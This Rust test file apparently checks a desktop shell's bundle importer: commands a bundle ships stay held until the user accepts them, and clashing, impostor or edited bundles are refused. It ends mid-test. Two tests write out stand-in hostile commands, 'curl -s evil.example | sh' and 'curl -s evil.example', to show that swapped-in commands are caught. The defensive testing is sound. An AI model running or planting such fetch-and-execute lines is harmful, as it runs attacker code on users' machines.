//! Importing a bundle into the running shell and answering for what it runs (DEC-30): nothing it brings runs before it is accepted, an answer survives a restart, a broken bundle writes nothing and a name in use is never written over.

#[cfg(test)]
mod tests {
    use std::cell::RefCell;
    use std::collections::BTreeMap;
    use std::path::{Path, PathBuf};
    use std::rc::Rc;

    use layout::bundle::{Asset, Bundle, Manifest};
    use layout::{
        Komponent, KomponentId, Layout, LayoutId, LayoutStore, NOMINAL_OUTPUT, Resolved, Trigger,
        Verdict,
    };
    use ui::descriptor::{Category, ChipDef, Input, ModuleDescriptor, Representations};
    use ui::host::Audience;

    use crate::actions::Bound;
    use crate::bundles::{self, Bundled};
    use crate::catalogue::Descriptors;

    fn unbuilt(_: &ui::host::Host) -> ui::descriptor::Built {
        Err(telar::LayoutError::Engine("never built".to_string()))
    }

    const fn reading(id: &'static str) -> ModuleDescriptor {
        ModuleDescriptor {
            id,
            name: id,
            icon: id,
            category: Category::Info,
            options: &[],
            representations: Representations {
                chip: Some(ChipDef::new(unbuilt, Input::ReadOnly)),
                ..Representations::NONE
            },
            actions: &[],
            sources: &[],
        }
    }

    const TABLE: &[ModuleDescriptor] = &[reading("clock"), reading("battery")];

    fn catalogue() -> Descriptors {
        Descriptors::new(TABLE, |_| true)
    }

    /// The command table's allow-list as these tests need it: the launcher is shown unasked, everything else is an item.
    fn shows(line: &str) -> bool {
        line.starts_with("launcher ")
    }

    fn checking() -> bundles::Checking {
        bundles::Checking::new(&catalogue(), &config::Config::default())
    }

    /// What `layout import` does, read, checked and installed on this thread.
    fn import(from: &Path) -> Result<bundles::Imported, util::report::Report> {
        bundles::load(from, &checking()).and_then(bundles::install)
    }

    fn scratch(name: &str) -> PathBuf {
        let dir = util::paths::isolated_root()
            .expect("a test resolves under its scratch root")
            .join(format!("bundles-{name}"));
        let _ = std::fs::remove_dir_all(&dir);
        std::fs::create_dir_all(&dir).expect("a scratch directory");
        dir
    }

    /// A store of no layouts of the user's but `own`, in a configuration directory of the test's own, installed as the one this thread's shell draws from.
    fn shell(test: &str, own: &[Layout]) -> (Rc<RefCell<LayoutStore>>, PathBuf) {
        let dir = scratch(test).join("layouts");
        std::fs::create_dir_all(&dir).unwrap();
        for layout in own {
            std::fs::write(
                dir.join(format!("{}.toml", layout.id)),
                toml::to_string_pretty(layout).unwrap(),
            )
            .unwrap();
        }
        let (mut store, report) = LayoutStore::load(&dir);
        assert!(report.is_clean(), "{}", report.render());
        store.set_trust(bundles::trust_of(&services::state::get(), shows));
        let store = Rc::new(RefCell::new(store));
        crate::layouts::install(Rc::clone(&store), Rc::new(|| {}));
        (store, dir)
    }

    fn sharing(name: &str) -> Layout {
        let mut layout: Layout = toml::from_str(&format!(
            r#"
[sources.weather]
kind = "poll"
cmd = "curl -s wttr.in/{name}"
every = "5m"

[[outputs]]
match = "*"

[[outputs.layers.background.areas]]
id = "wall"
kind = "wallpaper_region"
source = "assets/wall.png"

[[outputs.layers.top.areas]]
id = "bar"
kind = "bar"
edge = "top"
thickness = 30.0

[outputs.layers.top.areas.actions]
press = ["shell run notify-send {name}", "launcher toggle"]

[[outputs.layers.top.areas.groups]]
id = "start"
place = "zone"
zone = "start"
komponent = "{name}-pill"

[[outputs.layers.top.areas.groups]]
id = "end"
place = "zone"
zone = "end"

[[outputs.layers.top.areas.groups.children]]
id = "clock"
module = "clock"
"#
        ))
        .expect("the layout parses");
        layout.id = LayoutId::new(name);
        layout
    }

    fn pill() -> Komponent {
        toml::from_str(
            "[[children]]\nid = \"level\"\nmodule = \"battery\"\n[children.actions]\npress = [\"shell run powerprofilesctl set performance\"]\n",
        )
        .expect("the komponent parses")
    }

    /// The bundle `name` written to a directory of its own: the layout `name`, the komponent `<name>-pill` it draws, and one picture.
    fn bundle_of(name: &str, layout: Layout) -> PathBuf {
        let dir = scratch(&format!("{name}-bundle"));
        let picture = dir.join("source-wall.png");
        std::fs::write(&picture, b"pixels").unwrap();
        let bundle = Bundle {
            manifest: Manifest {
                name: name.to_string(),
                description: Some("a test bundle".to_string()),
                author: None,
            },
            layouts: BTreeMap::from([(layout.id.clone(), layout)]),
            komponents: BTreeMap::from([(KomponentId::new(format!("{name}-pill")), pill())]),
            assets: BTreeMap::from([("wall.png".to_string(), Asset::At(picture))]),
            texts: BTreeMap::new(),
        };
        let out = dir.join("bundle");
        bundle.write(&out).expect("the bundle writes");
        out
    }

    fn imported(name: &str) -> Bundled {
        bundles::bundles()
            .expect("a store")
            .into_iter()
            .find(|bundle| bundle.name == name)
            .expect("the bundle is remembered")
    }

    fn resolved(store: &Rc<RefCell<LayoutStore>>, id: &str) -> Resolved {
        let store = store.borrow();
        let layout = store.get(&LayoutId::new(id)).expect("the store holds it");
        layout::resolve(layout, store.all(), NOMINAL_OUTPUT, None).0
    }

    fn declared(store: &Rc<RefCell<LayoutStore>>, id: &str) -> Vec<String> {
        let store = store.borrow();
        let layout = store.get(&LayoutId::new(id)).expect("the store holds it");
        let (sources, _) = automation::sources::of_layout(
            layout,
            store.all(),
            &config::AutomationConfig::default(),
        );
        sources.iter().map(|(name, _)| name.clone()).collect()
    }

    thread_local! {
        static RAN: RefCell<Vec<String>> = const { RefCell::new(Vec::new()) };
    }

    /// Presses every gesture the bar and each of its instances bind, with the command table standing in for the shell's: what reached it, line by line.
    fn press_everything(resolved: &Resolved) -> Vec<String> {
        services::command::set_runner(
            |line| {
                RAN.with(|ran| ran.borrow_mut().push(line.to_string()));
                "ok".to_string()
            },
            |_| true,
        );
        let bar = resolved
            .area(layout::LayerKind::Top, &layout::AreaId::new("bar"))
            .expect("the bar");
        let chains =
            std::iter::once(&bar.actions).chain(resolved.instances().map(|it| &it.actions));
        for actions in chains {
            if let Some(run) = Bound::of(actions, Audience::Owner).runs(Trigger::Press) {
                run();
            }
        }
        RAN.with(|ran| std::mem::take(&mut *ran.borrow_mut()))
    }

    /// A bundle with a `poll` running `curl` and `shell run` actions, one of them a komponent child's, runs none of it before it is accepted — no source is declared, so no producer can start, and no chain hands a held line to the command table — and runs it once accepted.
    #[test]
    fn an_imported_bundle_runs_nothing_before_it_is_trusted() {
        let (store, dir) = shell("trusted", &[]);
        let from = bundle_of("trusted", sharing("trusted"));

        let done = import(&from).unwrap_or_else(|report| panic!("{}", report.render()));
        assert_eq!(
            done.files,
            ["components/trusted-pill.toml", "layouts/trusted.toml"]
        );
        assert_eq!(done.items.len(), 3, "{:?}", done.items);
        assert!(
            done.items
                .iter()
                .all(|(_, verdict)| *verdict == Verdict::Pending)
        );
        assert!(bundles::pending().peek(), "the dialog is raised");
        assert!(dir.join("trusted.toml").is_file());
        let wall = bundles::assets_dir("trusted").join("wall.png");
        assert_eq!(std::fs::read(&wall).unwrap(), b"pixels");
        assert!(
            std::fs::read_to_string(dir.join("trusted.toml"))
                .unwrap()
                .contains(&wall.display().to_string()),
            "the picture is named where it now is"
        );

        assert!(
            declared(&store, "trusted").is_empty(),
            "no producer can start for it"
        );
        assert_eq!(
            press_everything(&resolved(&store, "trusted")),
            ["launcher toggle"]
        );

        let accepted = bundles::accept("trusted", &imported("trusted").all()).expect("it accepts");
        assert_eq!(accepted.len(), 3);
        assert!(!bundles::pending().peek(), "nothing waits");
        assert_eq!(declared(&store, "trusted"), ["weather"]);
        assert_eq!(
            press_everything(&resolved(&store, "trusted")),
            [
                "shell run notify-send trusted",
                "launcher toggle",
                "shell run powerprofilesctl set performance",
            ]
        );

        let text = std::fs::read_to_string(dir.join("trusted.toml"))
            .unwrap()
            .replace("curl -s wttr.in/trusted", "curl -s wttr.in/elsewhere");
        std::fs::write(dir.join("trusted.toml"), text).unwrap();
        crate::layouts::reload();
        let after = imported("trusted");
        let waiting: Vec<&str> = after.pending().map(|item| item.key.as_str()).collect();
        assert_eq!(
            waiting,
            ["sources.weather.cmd"],
            "the edited command alone asks again"
        );
        assert!(bundles::pending().peek());
        assert!(declared(&store, "trusted").is_empty());
        assert_eq!(press_everything(&resolved(&store, "trusted")).len(), 3);

        let run = after
            .items
            .iter()
            .find(|(item, _)| item.text == "shell run notify-send trusted")
            .map(|(item, _)| item.id())
            .expect("the area's line");
        bundles::answer_id("trusted", &run, false).expect("it declines");
        assert_eq!(
            press_everything(&resolved(&store, "trusted")),
            [
                "launcher toggle",
                "shell run powerprofilesctl set performance"
            ]
        );
        let held = {
            let store = store.borrow();
            layout::held(store.get(&LayoutId::new("trusted")).unwrap(), store.all())
        };
        assert!(
            held.findings()
                .any(|finding| finding.message.key() == Some("finding.trust_declined")),
            "{}",
            held.render()
        );
        assert!(bundles::answer_id("trusted", "nothing-like-it", true).is_err());
    }

    /// What the user answered is machine state, read back on the next start.
    #[test]
    fn an_answer_survives_a_restart() {
        let (store, dir) = shell("restart", &[]);
        let from = bundle_of("restart", sharing("restart"));
        import(&from).unwrap_or_else(|report| panic!("{}", report.render()));
        let weather = imported("restart")
            .items
            .into_iter()
            .find(|(item, _)| item.key == "sources.weather.cmd")
            .map(|(item, _)| item)
            .expect("the source");
        bundles::accept("restart", std::slice::from_ref(&weather)).expect("it accepts");
        drop(store);
        util::writer::flush();

        let (mut again, report) = LayoutStore::load(&dir);
        assert!(report.is_clean(), "{}", report.render());
        let state = services::state::on_disk();
        again.set_trust(bundles::trust_of(&state, shows));
        let verdicts: Vec<(String, Verdict)> = bundles::bundled(again.all(), &state)
            .into_iter()
            .find(|bundle| bundle.name == "restart")
            .expect("the bundle is remembered")
            .items
            .into_iter()
            .map(|(item, verdict)| (item.key, verdict))
            .collect();
        assert!(verdicts.contains(&("sources.weather.cmd".to_string(), Verdict::Accepted)));
        assert_eq!(
            verdicts
                .iter()
                .filter(|(_, verdict)| *verdict == Verdict::Pending)
                .count(),
            2,
            "{verdicts:?}"
        );
    }

    fn files_in(dir: &Path) -> Vec<String> {
        let mut files: Vec<String> = std::fs::read_dir(dir)
            .map(|entries| {
                entries
                    .flatten()
                    .map(|entry| entry.file_name().to_string_lossy().to_string())
                    .collect()
            })
            .unwrap_or_default();
        files.sort();
        files
    }

    /// DEC-29: a bundle that does not check fails with findings that say where, and nothing of it is written anywhere.
    #[test]
    fn a_broken_bundle_writes_nothing() {
        let (store, dir) = shell("broken", &[]);
        let mut layout = sharing("broken");
        layout.outputs[0].layers.top.areas[0].groups[1].children[0].module =
            Some("no-such-module".to_string());
        let from = bundle_of("broken", layout);

        let refused = import(&from).expect_err("it does not check");
        let finding = refused
            .errors
            .iter()
            .find(|finding| finding.message.key() == Some("finding.unknown_module"))
            .unwrap_or_else(|| panic!("{}", refused.render()));
        assert_eq!(finding.file, from.join("layouts/broken.toml"));
        assert!(
            finding.key.ends_with("children.clock.module"),
            "{}",
            finding.key
        );

        assert!(files_in(&dir).is_empty(), "no layout was written");
        assert!(files_in(&layout::components_beside(&dir)).is_empty());
        assert!(!bundles::assets_dir("broken").exists());
        assert!(!services::state::get().bundles.contains_key("broken"));
        assert!(store.borrow().get(&LayoutId::new("broken")).is_none());
    }

    /// The user's own layouts are never written over: a name in use is refused, and a reimport replaces only a file the same bundle wrote that nobody has changed since.
    #[test]
    fn a_name_in_use_is_refused_and_a_reimport_replaces_only_what_it_wrote() {
        let mut mine = sharing("taken");
        mine.name = "mine".to_string();
        let (store, dir) = shell("taken", &[mine]);
        let before = std::fs::read_to_string(dir.join("taken.toml")).unwrap();
        let from = bundle_of("taken", sharing("taken"));

        let refused = import(&from).expect_err("the name is the user's");
        assert!(
            refused.errors.iter().any(|finding| finding.message.key()
                == Some("finding.bundle_clash")
                && finding.file == Path::new("layouts/taken.toml")),
            "{}",
            refused.render()
        );
        assert_eq!(
            std::fs::read_to_string(dir.join("taken.toml")).unwrap(),
            before
        );
        assert!(!services::state::get().bundles.contains_key("taken"));

        let from = bundle_of("again", sharing("again"));
        import(&from).unwrap_or_else(|report| panic!("{}", report.render()));
        bundles::accept("again", &imported("again").all()).expect("it accepts");
        import(&from).unwrap_or_else(|report| {
            panic!("a reimport replaces what it wrote: {}", report.render())
        });
        assert!(
            imported("again").pending().next().is_none(),
            "the same text keeps its answer through a reimport"
        );

        let edited = std::fs::read_to_string(dir.join("again.toml"))
            .unwrap()
            .replace("thickness = 30.0", "thickness = 32.0");
        std::fs::write(dir.join("again.toml"), &edited).unwrap();
        crate::layouts::reload();
        let refused = import(&from).expect_err("the user changed it, so it is theirs to keep");
        assert!(
            refused.render().contains("layouts/again.toml"),
            "{}",
            refused.render()
        );
        assert_eq!(
            std::fs::read_to_string(dir.join("again.toml")).unwrap(),
            edited
        );
        drop(store);
    }

    /// An expression reading a source held for trust waits for it, said once: `layout check` warns of the held command alone — never of a variable of that name — and the running shell's environment checks the expression as the source's type and reads it as a wait, "held until you trust it", not as a failure.
    #[test]
    fn an_expression_reading_a_held_source_waits_for_trust_said_once() {
        let mut shared = sharing("held-read");
        shared.outputs[0].layers.top.areas[0].visible = Some(layout::Expr("$weather != ''".into()));
        let (store, _) = shell("held-read", &[]);
        let from = bundle_of("held-read", shared);
        import(&from).unwrap_or_else(|report| panic!("{}", report.render()));

        let (report, _) = {
            let store = store.borrow();
            catalogue().check(
                store.get(&LayoutId::new("held-read")).unwrap(),
                store.all(),
                &|_| None,
                &config::AutomationConfig::default(),
            )
        };
        let about_weather: Vec<String> = report
            .findings()
            .filter(|finding| finding.key.contains("weather") || finding.key.ends_with("visible"))
            .map(|finding| format!("{} {}", finding.key, finding.message.english()))
            .collect();
        assert_eq!(about_weather.len(), 1, "{about_weather:?}");
        assert!(
            about_weather[0].starts_with("sources.weather.cmd "),
            "{about_weather:?}"
        );

        let (sources, _) = {
            let store = store.borrow();
            automation::sources::of_layout(
                store.get(&LayoutId::new("held-read")).unwrap(),
                store.all(),
                &config::AutomationConfig::default(),
            )
        };
        let _scope = telar::owner_scope();
        let env = automation::Environment::new([], sources);
        let compiled = env
            .compile("$weather != ''")
            .expect("it checks against the source's type");
        let read = env.bind(compiled, automation::Gate::always()).get();
        let error = read.error.expect("nothing is read before it is trusted");
        assert!(automation::env::awaits_reading(&error), "a wait: {error:?}");
        assert_eq!(
            automation::env::describe(&error.code).english(),
            "`$weather` came with a bundle and is held until you trust what it runs"
        );
    }

    /// A layout the user wrote runs what it says, bundles or no bundles.
    #[test]
    fn a_layout_of_the_users_own_is_never_held() {
        let mut mine = sharing("own");
        mine.outputs[0].layers.top.areas[0].groups.remove(0);
        let (store, _) = shell("own", &[mine]);
        let from = bundle_of("own-neighbour", sharing("own-neighbour"));
        import(&from).unwrap_or_else(|report| panic!("{}", report.render()));

        assert_eq!(declared(&store, "own"), ["weather"]);
        assert_eq!(
            press_everything(&resolved(&store, "own")),
            ["shell run notify-send own", "launcher toggle"]
        );
        let held = {
            let store = store.borrow();
            layout::held(store.get(&LayoutId::new("own")).unwrap(), store.all())
        };
        assert!(held.is_clean(), "{}", held.render());
    }

    fn item_at(name: &str, key: &str) -> layout::Item {
        imported(name)
            .items
            .into_iter()
            .find(|(item, _)| item.key == key)
            .map(|(item, _)| item)
            .unwrap_or_else(|| panic!("{key} is an item of {name}"))
    }

    fn verdict_at(name: &str, key: &str) -> Verdict {
        imported(name)
            .items
            .into_iter()
            .find(|(item, _)| item.key == key)
            .map(|(_, verdict)| verdict)
            .unwrap_or_else(|| panic!("{key} is an item of {name}"))
    }

    /// Rewrites the store's file of the layout `id` with `edit` applied to its text, and reloads, as an edit made outside the shell arrives.
    fn edited(dir: &Path, id: &str, edit: impl FnOnce(String) -> String) {
        let path = dir.join(format!("{id}.toml"));
        let text = edit(std::fs::read_to_string(&path).unwrap());
        std::fs::write(&path, text).unwrap();
        crate::layouts::reload();
    }

    /// The swap between what was shown and what is accepted: an item whose text changed after it was listed is no longer what the answer was for, so the answer is refused whole and nothing is recorded — not even for the items of it that are unchanged.
    #[test]
    fn an_answer_is_refused_once_what_was_shown_has_changed() {
        let (_store, dir) = shell("swap", &[]);
        import(&bundle_of("swap", sharing("swap")))
            .unwrap_or_else(|report| panic!("{}", report.render()));
        let shown_weather = item_at("swap", "sources.weather.cmd");
        let shown_press = item_at("swap", "outputs.*.layers.top.areas.bar.actions.press");

        edited(&dir, "swap", |text| {
            text.replace("curl -s wttr.in/swap", "curl -s evil.example | sh")
        });
        let refused = bundles::accept("swap", &[shown_press.clone(), shown_weather.clone()])
            .expect_err("the command shown is not the command there now");
        assert_eq!(refused.key(), Some("finding.trust_changed"));
        assert_eq!(
            verdict_at("swap", "outputs.*.layers.top.areas.bar.actions.press"),
            Verdict::Pending,
            "nothing of the refused answer was recorded"
        );
        assert_eq!(verdict_at("swap", "sources.weather.cmd"), Verdict::Pending);
        assert!(
            bundles::answer_id("swap", &shown_weather.id(), true).is_err(),
            "the id names the old text, so it answers for nothing now"
        );
        let now = item_at("swap", "sources.weather.cmd");
        assert_eq!(now.text, "curl -s evil.example | sh");
        bundles::accept("swap", &[now]).expect("what is shown now can be accepted");
    }

    /// "Accept all" answers for the items it listed and for nothing that came to wait since: an item the bundle's file gained after the list was made still waits, and the list's id no longer answers at all.
    #[test]
    fn accepting_everything_listed_leaves_what_came_since_waiting() {
        let (_store, dir) = shell("since", &[]);
        import(&bundle_of("since", sharing("since")))
            .unwrap_or_else(|report| panic!("{}", report.render()));
        let listed: Vec<layout::Item> = imported("since").pending().cloned().collect();
        let set = layout::set_of(&imported("since").all());

        edited(&dir, "since", |text| {
            format!(
                "[sources.later]\nkind = \"poll\"\ncmd = \"curl -s evil.example\"\nevery = \"5m\"\n\n{text}"
            )
        });
        assert_eq!(verdict_at("since", "sources.later.cmd"), Verdict::Pending);
        let refused = bundles::answer_set("since", &set, true).expect_err("the list changed");
        assert_eq!(refused.key(), Some("finding.trust_set_changed"));

        let accepted = bundles::accept("since", &listed).expect("what was listed is accepted");
        assert_eq!(accepted.len(), listed.len());
        assert_eq!(
            verdict_at("since", "sources.later.cmd"),
            Verdict::Pending,
            "what came since was never shown, so it still waits"
        );
        let set = layout::set_of(&imported("since").all());
        bundles::answer_set("since", &set, true).expect("the list as it is now");
        assert_eq!(verdict_at("since", "sources.later.cmd"), Verdict::Accepted);
    }

    /// A bundle that only takes another's name — other files, another manifest — is not a reimport of it: refused before anything is written, the first bundle's files, pictures and record untouched.
    #[test]
    fn a_bundle_taking_another_bundles_name_is_refused() {
        let (_store, dir) = shell("twin", &[]);
        import(&bundle_of("twin", sharing("twin")))
            .unwrap_or_else(|report| panic!("{}", report.render()));
        bundles::accept("twin", &imported("twin").all()).expect("trusted");
        let record = services::state::get().bundles["twin"].clone();
        let written = std::fs::read_to_string(dir.join("twin.toml")).unwrap();
        let picture = std::fs::read(bundles::assets_dir("twin").join("wall.png")).unwrap();

        let mut impostor = sharing("twin");
        impostor.id = LayoutId::new("twin-extra");
        let from = bundle_of("twin", impostor);
        std::fs::write(from.join("assets/wall.png"), b"other pixels").unwrap();
        let refused = import(&from).expect_err("a different bundle of the same name");
        assert!(
            refused
                .errors
                .iter()
                .any(|finding| finding.message.key() == Some("finding.bundle_impostor")),
            "{}",
            refused.render()
        );
        assert_eq!(services::state::get().bundles["twin"], record);
        assert_eq!(
            std::fs::read_to_string(dir.join("twin.toml")).unwrap(),
            written
        );
        assert!(!dir.join("twin-extra.toml").exists());
        assert_eq!(
            std::fs::read(bundles::assets_dir("twin").join("wall.png")).unwrap(),
            picture,
            "its pictures are not overwritten either"
        );
    }

    /// An update of a bundle is a reimport of it: a new description, an author, a new picture and a changed command are what an update brings, so it is installed over what it wrote, and only the command that changed asks again.
    #[test]
    fn an_update_that_changes_what_its_files_say_is_a_reimport() {
        let (_store, dir) = shell("update", &[]);
        let from = bundle_of("update", sharing("update"));
        import(&from).unwrap_or_else(|report| panic!("{}", report.render()));
        bundles::accept("update", &imported("update").all()).expect("trusted");

        let mut update = layout::bundle::read(&from).unwrap();
        update.manifest.description = Some("the same bundle, described anew".to_string());
        update.manifest.author = Some("someone".to_string());
        let layout = update.layouts.values_mut().next().unwrap();
        *layout = toml::from_str(
            &toml::to_string_pretty(layout)
                .unwrap()
                .replace("curl -s wttr.in/update", "curl -s wttr.in/updated"),
        )
        .unwrap();
        let out = scratch("update-again").join("bundle");
        let picture = out.with_file_name("new-wall.png");
        std::fs::write(&picture, b"new pixels").unwrap();
        update
            .assets
            .insert("wall.png".to_string(), Asset::At(picture));
        update.write(&out).unwrap();

        import(&out).unwrap_or_else(|report| panic!("an update: {}", report.render()));
        let waiting: Vec<String> = imported("update")
            .pending()
            .map(|item| item.key.clone())
            .collect();
        assert_eq!(waiting, ["sources.weather.cmd"]);
        assert!(
            std::fs::read_to_string(dir.join("update.toml"))
                .unwrap()
                .contains("wttr.in/updated")
        );
        assert_eq!(
            std::fs::read(bundles::assets_dir("update").join("wall.png")).unwrap(),
            b"new pixels"
        );
    }

    /// A bundle whose files were all deleted gives its name up: a bundle of that name writing other files is then a first import, not an impostor, and finds no answers waiting for it.
    #[test]
    fn a_bundle_whose_files_are_gone_gives_its_name_up() {
        let (_store, dir) = shell("given", &[]);
        import(&bundle_of("given", sharing("given")))
            .unwrap_or_else(|report| panic!("{}", report.render()));
        bundles::accept("given", &imported("given").all()).expect("trusted");
        std::fs::remove_file(dir.join("given.toml")).unwrap();
        std::fs::remove_file(layout::components_beside(&dir).join("given-pill.toml")).unwrap();
        crate::layouts::reload();

        let mut other = sharing("given");
        other.id = LayoutId::new("given-other");
        import(&bundle_of("given", other))
            .unwrap_or_else(|report| panic!("its name is free: {}", report.render()));
        let record = services::state::get().bundles["given"].clone();
        assert_eq!(
            record.files.keys().cloned().collect::<Vec<_>>(),
            ["components/given-pill.toml", "layouts/given-other.toml"]
        );
        assert!(
            imported("given")
                .items
                .iter()
                .all(|(_, verdict)| *verdict == Verdict::Pending)
        );
    }

    /// Every staged directory holding `content` as its `wall.png`: what a failed import of a bundle carrying that picture would leave behind.
    fn staged_holding(content: &[u8]) -> Vec<PathBuf> {
        let root = bundles::assets_dir("x").parent().unwrap().to_path_buf();
        std::fs::read_dir(&root)
            .map(|entries| {
                entries
                    .flatten()
                    .map(|entry| entry.path())
                    .filter(|path| {
                        path.file_name()
                            .and_then(|it| it.to_str())
                            .is_some_and(|it| it.starts_with(".incoming-"))
                            && std::fs::read(path.join("wall.png")).is_ok_and(|it| it == content)
                    })
                    .collect()
            })
            .unwrap_or_default()
    }

    /// A refused import leaves nothing staged behind: the pictures copied in for it go with it.
    #[test]
    fn a_refused_import_leaves_nothing_staged() {
        let mut mine = sharing("staged");
        mine.name = "mine".to_string();
        let (_store, _) = shell("staged", &[mine]);
        let from = bundle_of("staged", sharing("staged"));
        std::fs::write(from.join("assets/wall.png"), b"staged pixels").unwrap();

        let loaded = bundles::load(&from, &checking())
            .unwrap_or_else(|report| panic!("{}", report.render()));
        assert_eq!(
            staged_holding(b"staged pixels").len(),
            1,
            "staged while loaded"
        );
        bundles::install(loaded).expect_err("the name is the user's");
        assert!(staged_holding(b"staged pixels").is_empty());
        assert!(!bundles::assets_dir("staged").exists());
    }

    /// A staging directory left by a process that is gone — a shell killed mid-import — is swept by the next import, and one that is a link is never followed.
    #[test]
    fn what_a_killed_import_staged_is_swept_by_the_next() {
        let (_store, _) = shell("swept", &[]);
        let root = bundles::assets_dir("x").parent().unwrap().to_path_buf();
        let dead = u32::MAX;
        let abandoned = root.join(format!(".incoming-{dead}-0"));
        std::fs::create_dir_all(&abandoned).unwrap();
        std::fs::write(abandoned.join("wall.png"), b"left behind").unwrap();
        let elsewhere = scratch("swept-elsewhere");
        std::fs::write(elsewhere.join("keep.png"), b"not the shell's").unwrap();
        let link = root.join(format!(".incoming-{dead}-1"));
        let _ = std::fs::remove_file(&link);
        std::os::unix::fs::symlink(&elsewhere, &link).unwrap();

        import(&bundle_of("swept", sharing("swept")))
            .unwrap_or_else(|report| panic!("{}", report.render()));
        assert!(!abandoned.exists());
        assert!(
            elsewhere.join("keep.png").is_file(),
            "a link is not followed"
        );
        let _ = std::fs::remove_file(&link);
    }

    /// A file another bundle wrote is that bundle's: a second bundle naming the same layout is refused, not handed the first one's answers.
    #[test]
    fn a_file_another_bundle_wrote_is_not_taken_over() {
        let (_store, _) = shell("claimed", &[]);
        import(&bundle_of("first", sharing("first")))
            .unwrap_or_else(|report| panic!("{}", report.render()));
        let mut taking = sharing("first");
        taking.name = "taking".to_string();
        let mut bundle = layout::bundle::read(&bundle_of("first", taking)).unwrap();
        bundle.manifest.name = "second".to_string();
        let out = scratch("claimed-second").join("bundle");
        bundle.write(&out).unwrap();
        let refused = import(&out).expect_err("the first bundle's file");
        assert!(
            refused
                .errors
                .iter()
                .any(|finding| finding.message.key() == Some("finding.bundle_claimed")),
            "{}",
            refused.render()
        );
        assert!(!services::state::get().bundles.contains_key("second"));
    }

    /// A bundle whose files were deleted takes its answers along: the next import writing those paths — another bundle's, or the same bundle's again — starts with every item waiting, and a record left claiming nothing is forgotten.
    #[test]
    fn a_deleted_bundles_answers_do_not_carry_over() {
        let (_store, dir) = shell("deleted", &[]);
        let from = bundle_of("deleted", sharing("deleted"));
        let delete = || {
            std::fs::remove_file(dir.join("deleted.toml")).unwrap();
            std::fs::remove_file(layout::components_beside(&dir).join("deleted-pill.toml"))
                .unwrap();
            crate::layouts::reload();
        };
        import(&from).unwrap_or_else(|report| panic!("{}", report.render()));
        bundles::accept("deleted", &imported("deleted").all()).expect("trusted");
        assert!(bundles::assets_dir("deleted").join("wall.png").is_file());
        delete();

        let mut heir = layout::bundle::read(&from).unwrap();
        heir.manifest.name = "heir".to_string();
        let out = scratch("deleted-heir").join("bundle");
        heir.write(&out).unwrap();
        import(&out).unwrap_or_else(|report| panic!("{}", report.render()));
        assert!(
            !services::state::get().bundles.contains_key("deleted"),
            "nothing of the first bundle is left"
        );
        assert!(
            !bundles::assets_dir("deleted").exists(),
            "its pictures went with its record"
        );
        assert!(bundles::assets_dir("heir").join("wall.png").is_file());
        assert!(
            imported("heir")
                .items
                .iter()
                .all(|(_, verdict)| *verdict == Verdict::Pending),
            "{:?}",
            imported("heir").items
        );

        bundles::accept("heir", &imported("heir").all()).expect("trusted");
        delete();
        let out = scratch("deleted-again").join("bundle");
        heir.write(&out).unwrap();
        import(&out).unwrap_or_else(|report| panic!("{}", report.render()));
        assert!(
            imported("heir")
                .items
                .iter()
                .all(|(_, verdict)| *verdict == Verdict::Pending),
            "the same bundle imported again over files it lost asks again"
        );
    }

    /// A preview is drawn from what the shell holds, held back as the screen is: a bundle's held line is no more pressable in a preview than on the bar.
    #[test]
    fn a_preview_holds_back_what_the_screen_holds_back() {
        let (store, _) = shell("preview", &[]);
        import(&bundle_of("preview", sharing("preview")))
            .unwrap_or_else(|report| panic!("{}", report.render()));
        let layout = store
            .borrow()
            .get(&LayoutId::new("preview"))
            .unwrap()
            .clone();
        layout::set_running(std::sync::Arc::new(layout));
        let (_, bar) =
            crate::preview::previewed(layout::LayerKind::Top, &|area| area.id.as_str() == "bar")
                .expect("the bundle's bar");
        assert_eq!(bar.actions[&Trigger::Press].0, ["launcher toggle"]);
    }

    /// What a bundle's files say is checked where it is read, on the import worker, against tables handed over from the thread that started the import: a check made off the driver thread finds exactly what one made on it does.
    #[test]
    fn a_bundle_is_checked_on_the_thread_that_reads_it() {
        let (_store, _) = shell("checked-off-thread", &[]);
        let mut broken = sharing("off-thread");
        broken.outputs[0].layers.top.areas[0].groups[1].children[0].module =
            Some("no-such-module".to_string());
        let from = bundle_of("off-thread", broken);
        let checking = checking();
        let elsewhere = std::thread::spawn(move || {
            bundles::load(&from, &checking).err().map(|report| {
                report
                    .errors
                    .iter()
                    .map(|it| it.message.key().map(str::to_string))
                    .collect::<Vec<_>>()
            })
        })
        .join()
        .expect("the worker answers");
        assert!(
            elsewhere
                .expect("refused off the driver thread")
                .contains(&Some("finding.unknown_module".to_string()))
        );

        let fine = bundle_of("on-worker", sharing("on-worker"));
        let checking = self::checking();
        let loaded = std::thread::spawn(move || bundles::load(&fine, &checking).is_ok())
            .join()
            .unwrap();
        assert!(
            loaded,
            "a bundle that checks is read whole on another thread"
        );
    }

    /// A fault while reading or checking a bundle is caught at the worker's edge and answered as the import's failure, so the driver thread hears how the import ended and the next import is not refused as one already running.
    #[test]
    fn a_panic_on_the_import_worker_is_an_import_that_failed() {
        let (_store, _) = shell("panicked", &[]);
        let from = bundle_of("panicked", sharing("panicked"));
        let faulty = bundles::Checking::new(
            &Descriptors::new(TABLE, |_| panic!("the command table broke")),
            &config::Config::default(),
        );
        let report = std::thread::spawn(move || bundles::load_guarded(&from, &faulty).err())
            .join()
            .expect("the worker lives on")
            .expect("the import failed");
        let finding = &report.errors[0];
        assert_eq!(
            finding.message.key(),
            Some("finding.bundle_import_panicked")
        );
        assert!(
            finding
                .message
                .english()
                .contains("the command table broke"),
            "{}",
            report.render()
        );
        import(&bundle_of("after-panic", sharing("after-panic")))
            .unwrap_or_else(|report| panic!("the next import runs: {}", report.render()));
    }

    fn read_only(dir: &Path, read_only: bool) {
        use std::os::unix::fs::PermissionsExt;
        std::fs::create_dir_all(dir).unwrap();
        let mode = if read_only { 0o500 } else { 0o700 };
        std::fs::set_permissions(dir, std::fs::Permissions::from_mode(mode)).unwrap();
    }

    /// An install whose writes fail leaves machine state claiming exactly what was written: a komponent that could not be written is in neither the store nor the bundle's record while the layout that was written is in both, and when nothing could be written the record and the pictures are as they were before the import.
    #[test]
    fn a_failed_write_never_leaves_state_claiming_a_file_nobody_wrote() {
        let (store, dir) = shell("half-written", &[]);
        let components = layout::components_beside(&dir);
        read_only(&components, true);
        let refused = import(&bundle_of("half", sharing("half")));
        read_only(&components, false);
        refused.expect_err("the komponent could not be written");
        let record = services::state::get().bundles["half"].clone();
        assert_eq!(
            record.files.keys().collect::<Vec<_>>(),
            ["layouts/half.toml"],
            "the record claims what was written"
        );
